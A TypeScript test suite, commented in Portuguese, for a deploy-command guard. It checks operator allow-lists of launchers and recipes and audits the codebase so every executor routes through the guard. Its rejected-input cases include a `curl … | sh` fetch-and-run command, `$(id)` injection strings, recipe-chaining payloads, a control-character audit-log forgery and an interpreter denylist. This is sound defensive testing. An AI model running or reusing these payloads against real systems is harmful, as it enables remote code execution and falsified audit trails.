// story-ex0067 (3ª passada) — A RÉGUA DOS COMANDOS DECLARADOS EM BOARD-DATA, e o CENSO que a mantém completa.
//
// Esta é a terceira passada no mesmo card, e as duas anteriores falharam pelo MESMO motivo: a régua foi
// aplicada a alguns campos/posições, não a TODOS. Então aqui há duas classes de teste:
//
//  1. ATAQUES por campo e por POSIÇÃO — o que a régua tem de recusar, escrito como o atacante escreveria.
//  2. CENSO/LINT — a enumeração exaustiva. Se um QUARTO campo de comando nascer no contrato de `deploy:`,
//     ou se um executor deixar de passar pelo chokepoint, um teste falha. É o que impede a 4ª passada.
//
// O que a régua NÃO faz: pedir aprovação humana, tirar o self-deploy, ou reduzir capacidade do dono. O
// `deployCmd` e o `canaryCommand` REAIS de hoje continuam rodando (não-regressão explícita em cada um).

import { readdirSync, readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import {
  authorizeDeployCommand as authorize,
  deployPolicyFromSettings,
  parseDeclaredArgv,
  quoteArgv,
  resolveDeployLaunchers,
  resolveDeployRecipes,
  resolveRecipeRunners,
  type DeployCommandPolicy,
} from "./deploy-command-guard";

// A POLÍTICA deste alvo de teste — declarada, como um settings.yaml faria. A ferramenta não traz lançador nem receita
// de fábrica: tudo o que estas suítes autorizam está AQUI, com nomes inventados (uma oficina de bicicletas).
//   launchers     — [just, vercel, flyctl]: o task runner do alvo e dois CLIs de publicação genéricos
//   recipeRunners — [just]: só o task runner responde à cadeia receita→argumento
//   recipes       — [publish-static]: a única receita que board-data pode nomear
const POLICY: DeployCommandPolicy = deployPolicyFromSettings(
  { launchers: ["just", "vercel", "flyctl"], recipeRunners: ["just"], recipes: ["publish-static"] },
  {},
);
/** a régua sob a POLÍTICA do alvo de teste (ou sob a que o caso monta). */
const authorizeDeployCommand = (cmd: string, policy: DeployCommandPolicy = POLICY) => authorize(cmd, policy);

const src = (rel: string) => readFileSync(path.join(__dirname, rel), "utf8");
/** o código SEM comentários — um comentário que menciona a régua não é a régua (lição do lint de spawn). */
const code = (rel: string) => src(rel).replace(/\/\*[\s\S]*?\*\/|^\s*\/\/.*$/gm, "");

describe("a cadeia lançador→receita→argumento vale em TODA posição, não só na primeira", () => {
  // O ATAQUE que a 2ª e a 3ª passada deixaram passar. Medido com `just --dry-run` (just 1.51):
  //   just a b c   → roda a receita `a` E a receita `b` recebendo `c`
  //   just a c     → roda a receita `a` E a receita `c`
  //   just a foo   → erro "justfile does not contain recipe `foo`" (só receita real é alcançável)
  // A receita declarada (`publish-static`) tem ARIDADE 0 — logo TUDO que vem depois dela é
  // outra receita, e a validação de `argv[1]` sozinha deixava o justfile INTEIRO alcançável de board-data.
  it("uma SEGUNDA receita depois da autorizada é recusada nomeando a posição", () => {
    for (const evil of [
      "just publish-static deploy-site",
      "just publish-static clean-all",
      "just publish-static advance-card storymap",
      "just publish-static test-evidence",
      "just publish-static _deploy-preflight",
    ]) {
      const v = authorizeDeployCommand(evil);
      expect(v.argv, `payload na 2ª posição: ${evil}`).toBeNull();
      expect(v.refusal).toMatch(/fora da allow-list de receitas/);
      expect(v.refusal, "o motivo tem de explicar a ambiguidade de posição/aridade").toMatch(/posição 2|aridade/);
    }
  });

  it("a ATRIBUIÇÃO DE VARIÁVEL do task runner não é receita nem parâmetro — é reescrita da receita", () => {
    // Medido: `just VAR='$(id)' receita` sobrescreve uma variável do justfile e o valor é INTERPOLADO na
    // linha da receita (`echo A $(id)`), executado pelo shell do runner. Só é reconhecida ANTES da 1ª
    // receita, e é por isso que a posição 0 exige FORMA de nome de receita.
    for (const evil of [`just 'VAR=$(id -un)' publish-static`, "just VAR=/tmp/pwn publish-static"]) {
      expect(authorizeDeployCommand(evil).argv).toBeNull();
    }
  });

  it("um parâmetro que NÃO pode ser nome de receita segue passando (URL, caminho, chave=valor, versão)", () => {
    // A régua não pode custar capacidade: `just` não resolve `https://…`, `a/b` nem `1.2.3` como receita,
    // então essas palavras são parâmetro por eliminação e respondem só à régua de FORMA.
    const policy = deployPolicyFromSettings({ launchers: ["just"], recipeRunners: ["just"], recipes: ["canary-check"] }, {});
    for (const ok of [
      "just canary-check https://example.test/",
      "just canary-check tools/loja-web/",
      "just canary-check 1.2.3",
      "just canary-check sha=abc123",
    ]) {
      expect(authorizeDeployCommand(ok, policy).refusal, ok).toBeNull();
    }
  });

  it("o operador pode declarar o nome ALCANÇÁVEL em posição de receita (settings.yaml ou env, que board-data não alcança)", () => {
    const declarada = deployPolicyFromSettings({ launchers: ["just"], recipeRunners: ["just"], recipes: ["canary-check", "prod"] }, {});
    expect(authorizeDeployCommand("just canary-check prod", declarada).argv).toEqual(["just", "canary-check", "prod"]);
    // o MESMO nome vindo do env do serviço (o canal aditivo) abre a mesma porta
    const doEnv = deployPolicyFromSettings(
      { launchers: ["just"], recipeRunners: ["just"] },
      { AGILEHARNESS_DEPLOY_RECIPES: "canary-check, prod" },
    );
    expect(authorizeDeployCommand("just canary-check prod", doEnv).argv).toEqual(["just", "canary-check", "prod"]);
    // e sem a declaração a MESMA linha é recusada — a diferença é a declaração do operador, não o dado do board
    expect(authorizeDeployCommand("just canary-check prod").argv).toBeNull();
  });

  it("NÃO-REGRESSÃO: o deployCmd declarado continua autorizado, e sai como argv exata", () => {
    // `just publish-static` é o deployCmd que o alvo de teste declara em board-data.
    expect(authorizeDeployCommand("just publish-static").argv).toEqual(["just", "publish-static"]);
    expect(quoteArgv(["just", "publish-static"])).toBe(`'just' 'publish-static'`);
    // e os dois CLIs de publicação do exemplo do `_base` seguem intactos (ali não há segundo shell)
    expect(authorizeDeployCommand("vercel deploy --prod").refusal).toBeNull();
    expect(authorizeDeployCommand("flyctl deploy").refusal).toBeNull();
  });
});

describe("o rastro de AUDITORIA do que rodou como root não pode ser forjado pelo próprio comando", () => {
  it("caractere de controle C1 (NEL, CSI) num argumento é recusado, igual aos C0", () => {
    // A lente adversarial desta onda. A régua de auditoria enumerava "C0 + DEL" como se fosse o conjunto
    // inteiro dos caracteres de controle — e C1 (U+0080–U+009F) ficou de fora. O ataque não é execução: é
    // APAGAR o rastro. Um lançador que não é task runner aceita metacaractere DENTRO de aspas (correto: ali não
    // há segundo shell relendo), então um `deploy.command` de board-data pode carregar U+0085 (NEL), que em
    // terminal/leitor de log UTF-8 vale QUEBRA DE LINHA — e a linha `[postBuild] argv: …`, que existe para
    // dizer o que rodou como root, passa a exibir DUAS linhas plausíveis, a segunda escolhida pelo atacante.
    // Um argumento de deploy real (nome, caminho, URL, mensagem) não tem C1 nenhum, então recusar não custa
    // capacidade — é a mesma frase que justificou recusar C0.
    const NEL = "";
    const forjado = `vercel deploy --msg "ok${NEL}[postBuild] argv: just publish-static"`;
    const v = authorizeDeployCommand(forjado);
    expect(v.argv, "argumento com C1 não pode ser autorizado — ele reescreve a linha de auditoria").toBeNull();
    expect(v.refusal).toMatch(/controle/);
    for (const c of ["", "", ""]) {
      expect(authorizeDeployCommand(`vercel deploy --msg "ok${c}x"`).argv, `C1 U+${c.codePointAt(0)?.toString(16)}`).toBeNull();
    }
    // CONTRAPROVA: o que a régua já cobria segue coberto, e a mensagem legítima com espaço/acento PASSA — a
    // trava é de caractere de CONTROLE, não de texto humano.
    expect(authorizeDeployCommand(`vercel deploy --msg "ok\nquebrado"`).refusal).toMatch(/controle/);
    expect(authorizeDeployCommand(`vercel deploy --msg "publicação de emergência"`).argv).toEqual([
      "vercel",
      "deploy",
      "--msg",
      "publicação de emergência",
    ]);
  });
});

describe("os knobs do OPERADOR: o que eles liberam, e o que eles NÃO reabrem", () => {
  it("a allow-list de receitas só aceita o que TEM FORMA de nome de receita (o doc-comment agora é verdade)", () => {
    // A régua anterior filtrava pela forma de ARGUMENTO, mais larga: ela aceitava `a/b`, `a.b` e `k=v`
    // como "receita" enquanto o doc-comment afirmava que `/`, espaço e `$` eram ignorados. Duas verdades.
    expect(resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "../../evil $(id) a;b /tmp/x" }, ["publish-static"])).toEqual([
      "publish-static",
    ]);
    expect(resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "a/b a.b k=v 1recipe" }, ["publish-static"])).toEqual([
      "publish-static",
    ]);
    expect(resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "deploy-site-extra, _priv" }, ["publish-static"])).toEqual([
      "publish-static",
      "deploy-site-extra",
      "_priv",
    ]);
    // a forma também vale para o que vem do SETTINGS (o carregador já peneira, e a régua não confia só nele)
    expect(resolveDeployRecipes({}, ["boa-receita", "a;b", "$(id)"])).toEqual(["boa-receita"]);
  });

  it("um task runner adicionado pelo knob RECEBE a régua da cadeia quando declarado como tal", () => {
    // O buraco declarado da passada anterior: `RECIPE_RUNNERS` era um conjunto fixo com UM nome, então um
    // task runner que o operador adicionasse como lançador (`task`, `mise`, `rake`) interpolaria parâmetro
    // em shell recebendo APENAS a régua de lançador. Agora existe canal para declará-lo.
    const launchers = resolveDeployLaunchers({ AGILEHARNESS_DEPLOY_LAUNCHERS: "task" }, ["just"]);
    const recipeRunners = resolveRecipeRunners({ AGILEHARNESS_DEPLOY_RECIPE_RUNNERS: "task" }, ["just"]);
    const recipes = ["publish-static"];
    expect(recipeRunners.has("just")).toBe(true); // o declarado no settings nunca é substituído pelo env
    expect(authorizeDeployCommand("task deploy-site", { launchers, recipeRunners, recipes }).argv).toBeNull();
    expect(authorizeDeployCommand(`task publish-static '$(id)'`, { launchers, recipeRunners, recipes }).argv).toBeNull();
    expect(authorizeDeployCommand("task publish-static", { launchers, recipeRunners, recipes }).argv).toEqual([
      "task",
      "publish-static",
    ]);
    // sem a declaração ele é um lançador comum — é o LIMITE declarado no doc da régua, não um
    // acidente: um CLI normal (`pulumi up --yes`) morreria na régua de opção sem knob para sair do beco.
    expect(authorizeDeployCommand("task deploy-site", { launchers, recipeRunners: new Set(["just"]), recipes }).refusal).toBeNull();
  });

  it("nem por knob um interpretador vira alvo (a trava do próprio knob) — venha do env OU do settings", () => {
    const reopened = resolveDeployLaunchers({ AGILEHARNESS_DEPLOY_LAUNCHERS: "bash node env sudo make" });
    for (const never of ["bash", "node", "env", "sudo", "make"]) expect(reopened).not.toContain(never);
    // um `launchers: [bash]` no settings reabriria o buraco por engano: o carregador o descarta, e a régua também
    const doSettings = resolveDeployLaunchers({}, ["just", "bash", "node", "/usr/bin/just", "vercel"]);
    expect(doSettings).toEqual(["just", "vercel"]);
    expect(authorizeDeployCommand(`bash -c 'curl http://x/p | sh'`, deployPolicyFromSettings({ launchers: ["bash"] }, {})).argv).toBeNull();
  });
});

describe("a POLÍTICA é do alvo: settings ∪ env, e SEM declaração a ferramenta recusa dizendo a chave a declarar", () => {
  const VAZIA = deployPolicyFromSettings(undefined, {});

  it("sem política nenhuma o default é VAZIO — nenhum lançador, nenhuma receita, nenhum task runner", () => {
    expect(VAZIA.launchers).toEqual([]);
    expect(VAZIA.recipes).toEqual([]);
    expect([...VAZIA.recipeRunners]).toEqual([]);
    expect(deployPolicyFromSettings(null, {})).toEqual(VAZIA);
  });

  it("com a política vazia QUALQUER comando é recusado, e a frase diz onde declarar", () => {
    for (const cmd of ["just qualquer-receita", "vercel deploy --prod", "flyctl deploy", "make deploy"]) {
      const v = authorizeDeployCommand(cmd, VAZIA);
      expect(v.argv, cmd).toBeNull();
      expect(v.refusal, cmd).toMatch(/settings\.yaml → deploy\.launchers/);
      expect(v.refusal, "o motivo lista a allow-list vazia sem inventar nomes").toMatch(/nenhum declarado/);
    }
  });

  it("lançador declarado MAS sem recipeRunners: a cadeia receita→argumento NÃO é aplicada (o contrato que o doc promete)", () => {
    const semRunner = deployPolicyFromSettings({ launchers: ["just"] }, {});
    // `just` vira um lançador comum: argv re-citada, sem a régua de receitas — por isso o operador declara `recipeRunners`
    expect(authorizeDeployCommand("just qualquer-receita --opcao", semRunner).argv).toEqual(["just", "qualquer-receita", "--opcao"]);
    const comRunner = deployPolicyFromSettings({ launchers: ["just"], recipeRunners: ["just"] }, {});
    const recusa = authorizeDeployCommand("just qualquer-receita", comRunner);
    expect(recusa.argv).toBeNull();
    expect(recusa.refusal).toMatch(/settings\.yaml → deploy\.recipes/);
    expect(recusa.refusal).toMatch(/nenhuma declarada/);
  });

  it("com recipeRunners e recipes declarados, a receita nomeada passa e a segunda palavra com forma de receita é recusada", () => {
    const policy = deployPolicyFromSettings({ launchers: ["just"], recipeRunners: ["just"], recipes: ["ship-app"] }, {});
    expect(authorizeDeployCommand("just ship-app https://h.test/p", policy).argv).toEqual(["just", "ship-app", "https://h.test/p"]);
    const v = authorizeDeployCommand("just ship-app prod", policy);
    expect(v.argv).toBeNull();
    expect(v.refusal).toMatch(/fora da allow-list de receitas/);
    expect(v.refusal).toMatch(/settings\.yaml → deploy\.recipes/);
  });

  it("settings ∪ env são ADITIVOS, e o env nunca REMOVE o que o settings declarou", () => {
    const policy = deployPolicyFromSettings(
      { launchers: ["just"], recipeRunners: ["just"], recipes: ["ship-app"] },
      { AGILEHARNESS_DEPLOY_LAUNCHERS: "vercel", AGILEHARNESS_DEPLOY_RECIPE_RUNNERS: "task", AGILEHARNESS_DEPLOY_RECIPES: "ship-blog" },
    );
    expect(policy.launchers).toEqual(["just", "vercel"]);
    expect(policy.recipes).toEqual(["ship-app", "ship-blog"]);
    expect([...policy.recipeRunners]).toEqual(["just", "task"]);
    // sem repetição quando as duas fontes dizem o mesmo
    expect(deployPolicyFromSettings({ launchers: ["just"] }, { AGILEHARNESS_DEPLOY_LAUNCHERS: "just" }).launchers).toEqual(["just"]);
    // o env sozinho funciona (o drop-in do serviço) quando o settings não declara nada
    expect(deployPolicyFromSettings(undefined, { AGILEHARNESS_DEPLOY_LAUNCHERS: "vercel" }).launchers).toEqual(["vercel"]);
  });

  it("a mensagem de recusa de lançador cita o settings como lugar PRIMÁRIO e o env como alternativa", () => {
    const v = authorizeDeployCommand("make deploy", deployPolicyFromSettings({ launchers: ["just"] }, {}));
    expect(v.refusal).toMatch(/fora da allow-list de lançadores de deploy \(just\)/);
    expect(v.refusal).toMatch(/settings\.yaml → deploy\.launchers \(ou no env AGILEHARNESS_DEPLOY_LAUNCHERS/);
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────────
// O CENSO — a enumeração que impede a 4ª passada.
// ─────────────────────────────────────────────────────────────────────────────────────────────────
describe("censo: TODO campo de board-data que vira comando passa pelo chokepoint", () => {
  /** os campos de comando do contrato `deploy:` (contracts.ts boardDeployConfigShape), e quem os executa. */
  // `liveShaCommand` (o 4º) entrou com o preflight de frescor — executado por deploy-freshness.ts, que
  // passa pela MESMA régua (ver a asserção dos executores abaixo). `planCommand` (o 5º) é o plano em modo
  // leitura que o reconciliador das causas de parada executa (deploy-blocks.ts) — mesma régua.
  const COMMAND_FIELDS = ["command", "canaryCommand", "deployCmd", "liveShaCommand", "planCommand"] as const;

  it("o contrato de `deploy:` tem EXATAMENTE estes campos de comando — um quarto reprova aqui", () => {
    // A régua não pode depender de alguém lembrar. O contrato é a fonte: se um campo novo com cara de
    // comando (`*Command`, `*Cmd`, `exec*`) entrar em `boardDeployConfigShape`, este teste falha e força a
    // decisão explícita — rotear pelo guard ou justificar por que não é comando.
    const contracts = code(path.join("..", "contracts.ts"));
    const shape = contracts.slice(contracts.indexOf("boardDeployConfigShape = {"));
    const block = shape.slice(0, shape.indexOf("\n};"));
    // A varredura é por CHAVE em qualquer profundidade (não ancorada em início de linha): `deployCmd` mora
    // dentro de `surfaces[]`, aninhado num `z.object({…})` na mesma linha — foi exatamente esse campo
    // aninhado que a onda anterior tratou como se fosse o único, e um censo que não o vê não é censo.
    const found = [...block.matchAll(/([A-Za-z0-9_]+)\s*:/g)]
      .map((m) => m[1])
      .filter((k) => /command$|cmd$|^exec/i.test(k));
    expect(new Set(found)).toEqual(new Set(COMMAND_FIELDS));
  });

  it("os TRÊS executores importam a régua do mesmo módulo (nenhum tem cópia própria)", () => {
    for (const f of ["deploy.ts", "face-probe.ts", "deploy-freshness.ts", "deploy-blocks.ts"]) {
      expect(code(f), `${f}: o executor de comando declarado tem de passar pelo chokepoint`).toMatch(
        /from "\.\/deploy-command-guard"/,
      );
    }
    // e o módulo da régua não importa NADA — é o que permite ao canário depender dele sem arrastar o
    // manifesto que `product-deploy` lê em tempo de carga (a mina que manteve o 3º campo fora da régua).
    expect(code("deploy-command-guard.ts")).not.toMatch(/^\s*import\s/m);
  });

  it("a lavagem de proveniência do canário tem UM chamador — e a marca não se contorna por cast", () => {
    // `trustedCanaryFromOperator` é a única porta para um comando NÃO examinado (settings.yaml/env, que é
    // caminho de CONTROLE e não board-data). Uma segunda chamada em src/** seria a régua contornada.
    //
    // A varredura é em `src/**` INTEIRO, e por dois padrões. A passada anterior olhava QUATRO arquivos numa
    // lista fixa e só a chamada da função — então um caminho novo em qualquer outro arquivo (ou o cast que o
    // próprio título prometia cobrir, `as AuthorizedCanaryCommand`, que dispensa a função) passava com o lint
    // verde. Um chokepoint cujo lint não vê a superfície inteira volta a ser convenção.
    const raizSrc = path.resolve(__dirname, "..", "..", "..");
    const fontes: string[] = [];
    const andar = (dir: string) => {
      for (const e of readdirSync(dir, { withFileTypes: true })) {
        const abs = path.join(dir, e.name);
        if (e.isDirectory()) andar(abs);
        // testes são chamadores LEGÍTIMOS (é como se prova a marca) — o lint julga o código de produção
        else if (/\.tsx?$/.test(e.name) && !/\.test\.tsx?$/.test(e.name)) fontes.push(abs);
      }
    };
    andar(raizSrc);
    expect(fontes.length, "a varredura não achou fonte nenhuma — o lint estaria verde por vacuidade").toBeGreaterThan(200);

    const semComentario = (abs: string) => readFileSync(abs, "utf8").replace(/\/\*[\s\S]*?\*\/|^\s*\/\/.*$/gm, "");
    const rel = (abs: string) => path.relative(raizSrc, abs).split(path.sep).join("/");
    const lavagem: string[] = [];
    const casts: string[] = [];
    for (const abs of fontes) {
      const src = semComentario(abs);
      if (/\btrustedCanaryFromOperator\s*\(/.test(src)) lavagem.push(rel(abs));
      if (/\bas\s+AuthorizedCanaryCommand\b/.test(src)) casts.push(rel(abs));
    }
    expect(lavagem.sort()).toEqual(["lib/storymap/runner/face-probe.ts"]);
    expect(casts.sort(), "só o resolvedor da régua pode CARIMBAR a marca").toEqual([
      "lib/storymap/runner/face-probe.ts",
    ]);
  });

  it("TODO chamador de produção de authorizeDeployCommand passa a POLÍTICA explícita (nenhum herda uma allow-list suposta)", () => {
    // O tipo já obriga (a assinatura não tem default), mas um `as any` ou um wrapper de uma linha desfaria isso em silêncio:
    // a varredura de fonte é o que impede uma chamada de UM argumento de voltar a existir em qualquer arquivo de produção.
    const raizSrc = path.resolve(__dirname, "..", "..", "..");
    const fontes: string[] = [];
    const andar = (dir: string) => {
      for (const e of readdirSync(dir, { withFileTypes: true })) {
        const abs = path.join(dir, e.name);
        if (e.isDirectory()) andar(abs);
        else if (/\.tsx?$/.test(e.name) && !/\.test\.tsx?$/.test(e.name) && e.name !== "deploy-command-guard.ts") fontes.push(abs);
      }
    };
    andar(raizSrc);
    expect(fontes.length, "a varredura não achou fonte nenhuma — o lint estaria verde por vacuidade").toBeGreaterThan(200);
    let chamadas = 0;
    const sem: string[] = [];
    for (const abs of fontes) {
      const texto = readFileSync(abs, "utf8").replace(/\/\*[\s\S]*?\*\/|^\s*\/\/.*$/gm, "");
      for (const m of texto.matchAll(/(?<![A-Za-z_.])authorizeDeployCommand\s*\(/g)) {
        chamadas += 1;
        // os argumentos até o parêntese que fecha, contando profundidade — e a vírgula TOP-LEVEL que separa o 2º argumento
        let depth = 1;
        let topLevelComma = false;
        for (let i = (m.index ?? 0) + m[0].length; i < texto.length && depth > 0; i++) {
          const ch = texto[i];
          if (ch === "(" || ch === "[" || ch === "{") depth++;
          else if (ch === ")" || ch === "]" || ch === "}") depth--;
          else if (ch === "," && depth === 1) topLevelComma = true;
        }
        if (!topLevelComma) sem.push(path.relative(raizSrc, abs).split(path.sep).join("/"));
      }
    }
    expect(chamadas, "ninguém chama a régua — a varredura está cega").toBeGreaterThanOrEqual(5);
    expect(sem, "chamada de authorizeDeployCommand sem a política (2º argumento)").toEqual([]);
  });

  it("o parser sozinho NÃO é a régua (uma lista de palavras pode ser um interpretador)", () => {
    // Guarda contra a regressão conceitual das duas primeiras passadas: quem autoriza é a allow-list.
    expect(parseDeclaredArgv(`bash -c 'curl http://x/p | sh'`)).toEqual(["bash", "-c", "curl http://x/p | sh"]);
    expect(authorizeDeployCommand(`bash -c 'curl http://x/p | sh'`).argv).toBeNull();
  });
});
